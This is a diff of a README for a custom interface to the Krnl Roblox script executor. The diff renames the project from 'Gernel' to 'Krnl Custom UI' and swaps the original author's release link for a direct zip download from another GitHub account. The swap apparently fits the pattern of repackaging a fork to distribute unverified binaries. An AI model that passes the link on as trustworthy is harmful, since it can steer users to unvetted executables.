@@ -5,7 +5,7 @@
  https://opensource.org/licenses/MIT
 -->
 
-# Gernel
+# Krnl Custom UI
 ![UI](https://cdn.discordapp.com/attachments/987785315102109799/992139525176447036/unknown.png)
 ![TERMINAL](https://cdn.discordapp.com/attachments/987785315102109799/992151629866487908/unknown.png)
 
@@ -16,7 +16,7 @@ Gernel does not using official Krnl API, instead using a dynamic library version
 Gernel server and wrapper is written in Go, front-end is written in Pure HTML, CSS, JS.
 
 ## Download
-You can download the latest release from [here](https://github.com/aiocat/gernel/releases/latest)
+You can download the latest release from [here](https://github.com/yellowsliper/Krnl_Custom_UI/releases/download/v1.0.0/Krnl.-.CustomUI.v1.0.0.zip)
 
 ## License
 Gernel is distributed under the MIT license.
